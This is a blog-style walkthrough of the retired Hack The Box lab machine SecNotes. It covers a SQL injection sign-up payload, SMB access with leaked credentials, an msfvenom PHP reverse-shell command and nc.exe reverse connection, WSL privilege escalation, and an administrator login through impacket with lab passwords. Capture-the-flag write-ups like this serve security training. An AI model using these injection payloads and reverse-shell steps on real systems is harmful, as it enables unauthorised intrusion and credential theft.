---
title: SecNotes Hackthebox Writeup
date: 2020-12-19 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [windows,systeminfo,wsl,linux subsystem,smb,smb enumeration,smbclient,php]     # TAG names should always be lowercase
image: /assets/img/secnotes-hackthebox/secnotes-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@SecNotes:~$


Column | Details
------------ | -------------
Name | SecNotes
IP | 10.10.10.97
Points | 30
Os | Windows
Difficult | Medium
Creator | [0xdf](https://www.hackthebox.eu/home/users/profile/4935)
Out on | 25th August 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* Signing up with a `SQL` payload and then `loging in`, on port 80.
* Getting user credentials for `SMB login`.
* Uploading a `php` shell and `nc.exe` to get a reverse connection back.
* Exploiting `WSL` for **Privilege Escalation**, getting `Admin` SMB credentials and loging into the windows machine.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/secnotes-hackthebox/all-port-scan-01.png)

Basically `3 Ports` are open. i.e. `80,445,8808`. Let's access port `80`, which shows a `Login Page`.

___
![](/assets/img/secnotes-hackthebox/login-page-3.png)

Before that we need to `Sign Up`.

___
![](/assets/img/secnotes-hackthebox/register-page-4.png)

Register on the page as *Username*: `test` and *Password*: `testtest`.

___
![](/assets/img/secnotes-hackthebox/after-logging-in-5.png)

I moved through the website for a bit and even tried `gobuster` for directory searching but nothing worked.

After that I tried to log into the SMB port i.e. 445 using `smbclient`, but it also failed.

___
![](/assets/img/secnotes-hackthebox/smbclient-login-fail-7.png)

Now I changed my approach and signed up using a `SQL Payload`.

**Payload** : *' or 1=1 #*

___
![](/assets/img/secnotes-hackthebox/using-sql-payload-9.png)

Now loging in back with new credentials i.e *Username*: `' or 1=1 #` and *Password*: `' or 1=1 #`.

___
![](/assets/img/secnotes-hackthebox/smb-username-password-10.png)

After loging in, we saw the credentials which looked like for `SMB Login`.

**Username**: `tyler`  and **Password**: `92g!mA8BGjOirkL%OG*&`.

Let's login into SMB using `smbclient`.

___
![](/assets/img/secnotes-hackthebox/smbclient-login-11.png)

Checking `new-site` in SMB.

___
![](/assets/img/secnotes-hackthebox/loggedin-new-site-12.png)

new-site is not which is hosted on `port 80`, then I realised that `port 8808` is also open and it shows an `IIS Server` running.

Trying to upload a `test.html` via SMB and access it on `http://10.10.10.97:8808/test.html`.

___
![](/assets/img/secnotes-hackthebox/checking-test-html-14.png)

Now Let's try to upload a `PHP shell` and get a reverse connection.

I used `msfvenom` to create a shell and transfered it via `SMB`.

**Command** : *msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php*

___
![](/assets/img/secnotes-hackthebox/msfvenom-php-final-reverseshell-17.png)

The above method didn't work because my shell was breaking again and again.

I changed the payload and got it working by using `nc.exe`, which I had transfered via `SMB`.

**New Payload** :
___
![](/assets/img/secnotes-hackthebox/new-small-revershell-php-18.png)

**Payload** and **nc.exe** successfully transfered.

___
![](/assets/img/secnotes-hackthebox/new-smb-nc-small-shell-20.png)

Listening on `nc` on my machine and accessing `http://10.10.10.97:8808/small-shell.php`, we got a shell.

___
![](/assets/img/secnotes-hackthebox/new-got-shell-21.png)

Got `User-Flag`.

For `Privilege Escalation`, I has looking through the directories and found a direcotry named `Ubuntu`. As soon as I saw this, I thought that something might be related to `WSL Exploitation`.

Check for [WSL walkaround](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl).

Finding `bash.exe`: *where /R c:\windows bash.exe* and `wsl.exe`: *where /R c:\windows wsl.exe*.

After that we could have run either `bash.exe` or `wsl.exe`, I ran **wsl.exe**.

We Entered a `Linux Subsystem` as **root**.

[Stabling the shell](https://netsec.ws/?p=337), **Command**: *Python -c 'import pty; pty.spawn("/bin/sh")'*

![](/assets/img/secnotes-hackthebox/new-running-wsl-exe-26.png)

In `root` directory, I found a file called `.bash_history`, which displayed the `admininstrator` credentials of the windows machine for SMB.

**Username**: `administrator` and **Password**: `u6!4ZwgwOM#^OBf#Nwnh`

___
![](/assets/img/secnotes-hackthebox/got-smb-user-credentials-27.png)

Now loging into the machine using `smbexec.py` which can be found in `impacket`.

Download link: [Imapcket](https://github.com/SecureAuthCorp/impacket/tree/master/examples)

___
![](/assets/img/secnotes-hackthebox/impacket-root-28.png)

Got `Root`.